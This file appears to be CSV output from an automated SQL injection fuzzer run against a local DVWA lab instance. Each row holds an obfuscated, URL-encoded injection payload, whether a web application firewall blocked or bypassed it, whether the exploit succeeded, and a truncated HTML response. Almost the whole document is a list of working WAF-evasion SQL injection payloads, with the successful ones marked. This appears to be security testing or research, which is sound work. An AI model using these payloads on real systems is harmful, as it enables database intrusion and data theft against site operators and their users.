Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1+or+not+true=%0b(false)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0258,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0b!+{x%0b(select%0b1)}=1=%0b(!%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.026,72.53,No,500,
0%27<@!=1.+||%0bnot+true=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0234,72.53,No,500,
0%27<@!=1%0b||%0b!+{a+1}=1=%0b(not%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0554,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+!+true=+(!+{x%0b(select+1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0318,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0b{x+(select+1)}=1+like+{`if`%0b1}=1--+,Bypassed,No,None,piggyAtk,0.0327,72.53,No,500,
0'<@=1.%0bor%0b!%0b{a%0b1}=1=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.023,72.53,No,500,
0%27<@=.1+or+!%0b{a+1}=1=%0b(!+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0297,72.53,No,500,
0%27<@!=1+||%0bnot%0b{x+(select+1)}=1=%0b(not+{a%0b1}=1)+||%27,Blocked,No,None,Unknown,0.0188,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||+not+{a%0b1}=1=+(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.0324,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0345,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot+{a+1}=1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0271,72.53,No,500,
0'<@=1.+||+not~false=%0b(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.018,72.35,No,500,
0'<@=.1%0bor%0bnot%0b{`if`+1}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0237,72.35,No,500,
0%27<@=1%0bor%0b!+{x+(select%0b1)}=1=+(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0358,72.35,No,500,
0'<@!=1+||%0b{a%0b1}=1+like+{x+(select%0b1)}=1+or',Blocked,No,None,Unknown,0.013,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+or+0=+(!+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0167,72.35,No,500,
0'<@!=1+or%0bnot%0b{a+1}=1=+(!%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0269,72.35,No,500,
0%27<@=1.%0bor+!+true=+(!+{`if`+1}=1)+or',Bypassed,No,None,booleanAtk,0.0206,72.35,No,500,
0'<@!=.1%0b||+!+{x+(select+1)}=1=+(!%0b{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0253,72.35,No,500,
0'<@=1.%0bor+not%7efalse=%0b(not~0)%0b||',Bypassed,No,None,booleanAtk,0.0351,72.35,No,500,
0%27<@!=.1+or+!%0b{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0305,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+not+{x+(select+1)}=1=+(not~0)+||',Blocked,No,None,Unknown,0.0091,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+not%0b{x%0b(select+1)}=1=+(not+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0283,72.35,No,500,
0'<@=1.+||%0bnot+{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0377,72.35,No,500,
0'<@!=1%0b||%0bnot+{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0189,72.35,No,500,
0'<@!=1%0bor+not+true=%0b(!+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.0207,72.35,No,500,
0%27<@!=1+or%0bnot+{x%0b(select+1)}=1=%0b(not%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0136,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b{x+(select%0b1)}=1%0blike+{a%0b1}=1+or',Bypassed,No,None,Unknown,0.029,72.35,No,500,
0'<@!=1%0bor+!%7efalse=+(!+{`if`+1}=1)+||%27,Bypassed,No,None,booleanAtk,0.0365,72.35,No,500,
0'<@!=1+or%0bnot%0b{x%0b(select+1)}=1=+(!%0b{`if`+1}=1)%0b||%27,Blocked,No,None,Unknown,0.0189,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0188,72.35,No,500,
0'<@=.1+||+not+{`if`+1}=1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0362,72.35,No,500,
0'<@=1%0bor+!%0b{x%0b(select+1)}=1=%0b(!+1)%0b||',Bypassed,No,None,Unknown,0.032,72.35,No,500,
0'<@=1.%0bor%0b!%7efalse=+(not+true)%0bor%27,Bypassed,No,None,booleanAtk,0.0314,72.35,No,500,
0'or+@<@+||+true%0blike+{x+(select+1)}=1+||',Blocked,No,None,booleanAtk,0.022,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor%0b!+{x+(select+1)}=1=%0b(!+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0274,72.35,No,500,
0'<@=1%0b||%0bnot%0b{a%0b1}=1=%0b(!+1)+||%27,Bypassed,No,None,Unknown,0.0315,72.35,No,500,
0%27<@!=.1+||%0b!%0b{x%0b(select+1)}=1=+(!+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.053,72.35,No,500,
0%27<@=1+||+!%0b{x+(select+1)}=1=+(false)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0388,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+!+{x+(select+1)}=1=%0b(!%0b{`if`%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0209,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0282,72.49,No,500,
0%27<@=1+||%0bnot~false=%0b(not%0btrue)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.016,72.49,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0b!%0btrue=%0b(!%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0331,72.53,No,500,
0'<@!=1+||+not+{`if`+1}=1=%0b(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0377,72.53,No,500,
0'<@!=1+or%0b!%0b{`if`%0b1}=1=+(false)%0bor%27,Bypassed,No,None,booleanAtk,0.0298,72.53,No,500,
0%27<@!=1%0b||+false=+(not%0b1)%0bor',Bypassed,No,None,booleanAtk,0.0281,72.53,No,500,
0'<@!=.1+or+!+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1)+or',Blocked,No,None,Unknown,0.0245,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0bnot%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0502,72.53,No,500,
0'<@!=1+or%0bnot%0b1=%0b(!%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0249,72.53,No,500,
0'<@=1.+or%0b0=%0b(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0337,72.53,No,500,
0'<@=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not+{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0246,72.53,No,500,
0%27<@!=1+or+!+{x%0b(select+1)}=1=+(not+1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0237,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+not+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.031,72.53,No,500,
0'<@!=1.%0b||%0b!+{a+1}=1=+(!%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0193,72.53,No,500,
0'<@=1.%0b||+not%7efalse=+(!+{a+1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0137,72.53,No,500,
0%27<@!=.1%0b||+!+{`if`+1}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0239,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+!+{`if`+1}=1=+(!%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0194,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0bnot%0b{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0318,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or%0b!%0b{x+(select%0b1)}=1=+(!%7e0)%23,Blocked,No,None,piggyAtk,0.0187,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor%0bnot%0btrue=%0b(not+{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0261,72.53,No,500,
0'<@!=1%0bor+{x+(select+1)}=1%0blike+{x+(select%0b1)}=1+||%27,Bypassed,No,None,Unknown,0.0324,72.53,No,500,
0'<@!=1.+or+!+{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.019,72.35,No,500,
0'||+@<@.%0b||%0b!+{x%0b(select+1)}=1=+(!~0)+or%27,Bypassed,No,None,Unknown,0.0222,72.35,No,500,
0%27<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=%0b(not%0b1)+||',Bypassed,No,None,Unknown,0.0403,72.35,No,500,
0%27<@!=.1+||%0b!+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0173,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!%0b{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0413,72.35,No,500,
0%27<@!=1.+or%0b!+{a+1}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0163,72.35,No,500,
0%27<@=.1+or+not%0b{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0177,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+not+{`if`+1}=1=+(not~0)+||%27,Bypassed,No,None,Unknown,0.033,72.35,No,500,
0'or+@<@.%0b||%0bnot+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0154,72.35,No,500,
0%27<@=1+or+!+{a+1}=1=%0b(not%0btrue)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0322,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+{`if`%0b1}=1+like%0b{a%0b1}=1+or%27,Bypassed,No,None,Unknown,0.0313,72.35,No,500,
0%27<@!=1.+||%0bnot+{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0216,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+or%0b{x+(select+1)}=1+like+{x+(select%0b1)}=1%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0178,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+{`if`%0b1}=1=+(not%0b{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0166,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+not%7e0=+(not~false)--+,Bypassed,No,None,piggyAtk,0.019,72.35,No,500,
0'||+1<@.+or%0bnot+{`if`+1}=1%0bis+false%0bor',Bypassed,No,None,booleanAtk,0.0222,72.35,No,500,
0'<@!=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0276,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0bnot+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0128,72.35,No,500,
0%27<@=.1%0bor+{x%0b(select%0b1)}=1+like+{a+1}=1+or',Bypassed,No,None,Unknown,0.016,72.35,No,500,
0%27<@!=1.+||+not+{x%0b(select%0b1)}=1=%0b(!+{a%0b1}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0257,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
